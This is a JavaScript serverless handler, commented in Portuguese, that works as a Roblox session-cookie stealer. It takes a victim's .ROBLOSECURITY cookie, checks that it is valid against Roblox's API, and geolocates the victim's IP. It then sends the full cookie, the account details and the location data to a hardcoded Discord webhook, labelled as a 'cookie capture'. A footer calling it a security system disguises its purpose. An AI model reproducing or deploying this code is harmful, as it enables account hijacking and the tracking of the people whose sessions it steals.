export default async function handler(req, res) {
  // Permitir CORS
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  // Responder preflight requests
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  // Apenas POST
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { cookie, ip, device, timestamp } = req.body;

    // Validar dados básicos
    if (!cookie || cookie.length < 50) {
      return res.status(400).json({ error: 'Cookie inválido' });
    }

    // ===== VERIFICAÇÃO DO COOKIE COM ROBLOX =====
    let cookieValido = true;
    let contaRecente = false;
    let username = 'Desconhecido';
    let idadeConta = 'Desconhecida';
    let erroValidacao = null;

    try {
      // Fazer requisição para a API do Roblox para verificar o cookie
      const robloxResponse = await fetch('https://users.roblox.com/v1/users/authenticated', {
        headers: {
          'Cookie': `.ROBLOSECURITY=${cookie}`,
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
      });

      if (!robloxResponse.ok) {
        cookieValido = false;
        if (robloxResponse.status === 401) {
          erroValidacao = 'Cookie expirado ou inválido';
        }
      } else {
        // Cookie válido - buscar informações da conta
        const userData = await robloxResponse.json();
        username = userData.name || 'Desconhecido';
        
        // Buscar data de criação da conta
        const userInfoResponse = await fetch(`https://users.roblox.com/v1/users/${userData.id}`);
        if (userInfoResponse.ok) {
          const userInfo = await userInfoResponse.json();
          
          if (userInfo.created) {
            const dataCriacao = new Date(userInfo.created);
            const agora = new Date();
            const diffDias = Math.floor((agora - dataCriacao) / (1000 * 60 * 60 * 24));
            
            // Calcular idade da conta
            if (diffDias < 30) {
              contaRecente = true;
              if (diffDias < 1) {
                idadeConta = 'Menos de 1 dia';
              } else {
                idadeConta = `${diffDias} dias`;
              }
            } else if (diffDias < 365) {
              const meses = Math.floor(diffDias / 30);
              idadeConta = `${meses} meses`;
            } else {
              const anos = Math.floor(diffDias / 365);
              idadeConta = `${anos} anos`;
            }
          }
        }
      }
    } catch (e) {
      console.error('Erro ao verificar cookie com Roblox:', e);
      cookieValido = false;
      erroValidacao = 'Erro ao conectar com Roblox';
    }

    // Buscar informações detalhadas do IP
    let ipInfo = {};
    try {
      const ipResponse = await fetch(`http://ip-api.com/json/${ip}?fields=66846719`);
      ipInfo = await ipResponse.json();
    } catch (e) {
      console.error('Erro ao buscar info do IP:', e);
    }

    // WEBHOOK DO DISCORD
    const webhookURL = 'https://canary.discord.com/api/webhooks/1480235860002734152/8ZjlQOiaHtPrE9bz-yGaM_GiMC3akI7ptVW-aElQUvTjsk8jauXoaho6B1anWmy8a8QE';

    // Determinar cor e título baseado na validação
    let embedColor = 0x6366f1; // Azul padrão
    let embedTitle = '🔐 **NOVA CAPTURA DE COOKIE**';
    let embedDescription = 'Um novo cookie foi capturado pelo sistema Aurora';
    let embedContent = null;

    if (!cookieValido) {
      embedColor = 0xff0000; // Vermelho
      embedTitle = '❌ **COOKIE INVÁLIDO DETECTADO**';
      embedDescription = `Cookie inválido: ${erroValidacao || 'Não foi possível validar'}`;
    } else if (contaRecente) {
      embedColor = 0xffa500; // Laranja
      embedTitle = '⚠️ **CONTA RECENTE DETECTADA**';
      embedDescription = `Cookie válido mas a conta tem apenas ${idadeConta}`;
      embedContent = '@everyone ⚠️ CONTA RECENTE';
    } else {
      embedContent = '@everyone ✅ COOKIE VÁLIDO';
    }

    const embed = {
      content: embedContent,
      embeds: [{
        title: embedTitle,
        description: embedDescription,
        color: embedColor,
        fields: [
          {
            name: '🍪 **COOKIE COMPLETO**',
            value: '```' + cookie + '```'
          },
          {
            name: '👤 **INFORMAÇÕES DA CONTA**',
            value: `\`\`\`yml
Username: ${username}
Status: ${cookieValido ? '✅ Válido' : '❌ Inválido'}
Conta Recente: ${contaRecente ? '⚠️ Sim' : '✅ Não'}
Idade da Conta: ${idadeConta}
\`\`\``
          },
          {
            name: '📊 **INFORMAÇÕES DO DISPOSITIVO**',
            value: `\`\`\`yml
Dispositivo: ${device}
Navegador: ${getBrowserInfo(req)}
Sistema: ${getOSInfo(req)}
Idioma: ${req.headers['accept-language'] || 'Desconhecido'}
\`\`\``
          },
          {
            name: '🌍 **INFORMAÇÕES DO IP**',
            value: `\`\`\`yml
IP: ${ip}
País: ${ipInfo.country || 'Desconhecido'} ${ipInfo.countryCode || ''}
Região: ${ipInfo.regionName || 'Desconhecido'}
Cidade: ${ipInfo.city || 'Desconhecido'}
CEP: ${ipInfo.zip || 'Desconhecido'}
Latitude: ${ipInfo.lat || 'Desconhecido'}
Longitude: ${ipInfo.lon || 'Desconhecido'}
Fuso Horário: ${ipInfo.timezone || 'Desconhecido'}
Provedor: ${ipInfo.isp || 'Desconhecido'}
Organização: ${ipInfo.org || 'Desconhecido'}
Mobile: ${ipInfo.mobile ? 'Sim' : 'Não'}
Proxy/VPN: ${ipInfo.proxy ? 'Sim' : 'Não'}
Hosting: ${ipInfo.hosting ? 'Sim' : 'Não'}
\`\`\``
          },
          {
            name: '⏰ **TIMESTAMP**',
            value: `<t:${Math.floor(Date.now() / 1000)}:F> (<t:${Math.floor(Date.now() / 1000)}:R>)`,
            inline: true
          },
          {
            name: '🔢 **ID DA SESSÃO**',
            value: `\`${generateSessionId()}\``,
            inline: true
          },
          {
            name: '📏 **TAMANHO DO COOKIE**',
            value: `\`${cookie.length} caracteres\``,
            inline: true
          }
        ],
        footer: {
          text: 'Aurora Security System • Proteção Avançada',
          icon_url: 'https://media.discordapp.net/attachments/1478076459074719877/1478567053999869993/Gemini_Generated_Image_17qz9117qz9117qz.png?ex=69a8de60&is=69a78ce0&hm=30c2567486c3f374e4fdc3e9ed7712ff5613520c72a7264d002dd1ad2b696328&=&format=webp&quality=lossless&width=240&height=233'
        },
        timestamp: new Date().toISOString(),
        thumbnail: {
          url: 'https://media.discordapp.net/attachments/1456825082507956428/1477117859665805312/clideo_editor_64f89f8646e04ff7b36cd451bf005602_online-video-cutter.com.gif?ex=69a835f5&is=69a6e475&hm=47008cff92b32b165301e19e2f528da6f4b03f42900a8401c989976a082459cd&=&width=569&height=320'
        }
      }]
    };

    // Enviar para o Discord
    const response = await fetch(webhookURL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(embed)
    });

    if (!response.ok) {
      throw new Error('Falha ao enviar para Discord');
    }

    // Retornar resultado da verificação para o frontend
    return res.status(200).json({ 
      success: true,
      valido: cookieValido,
      contaRecente: contaRecente,
      username: username,
      idadeConta: idadeConta
    });
    
  } catch (error) {
    console.error('Erro:', error);
    return res.status(500).json({ error: 'Erro interno' });
  }
}

// Funções auxiliares
function getBrowserInfo(req) {
  const ua = req.headers['user-agent'] || '';
  if (ua.includes('Chrome') && !ua.includes('Edg')) return 'Google Chrome';
  if (ua.includes('Firefox')) return 'Mozilla Firefox';
  if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Apple Safari';
  if (ua.includes('Edg')) return 'Microsoft Edge';
  if (ua.includes('Opera') || ua.includes('OPR')) return 'Opera';
  return 'Desconhecido';
}

function getOSInfo(req) {
  const ua = req.headers['user-agent'] || '';
  if (ua.includes('Windows NT 10.0')) return 'Windows 10/11';
  if (ua.includes('Windows NT 6.3')) return 'Windows 8.1';
  if (ua.includes('Windows NT 6.2')) return 'Windows 8';
  if (ua.includes('Windows NT 6.1')) return 'Windows 7';
  if (ua.includes('Mac OS X')) return 'macOS';
  if (ua.includes('Linux') && !ua.includes('Android')) return 'Linux';
  if (ua.includes('Android')) return 'Android';
  if (ua.includes('iPhone') || ua.includes('iPad')) return 'iOS';
  return 'Desconhecido';
}

function generateSessionId() {
  return Math.random().toString(36).substring(2, 15) + 
         Math.random().toString(36).substring(2, 15);
}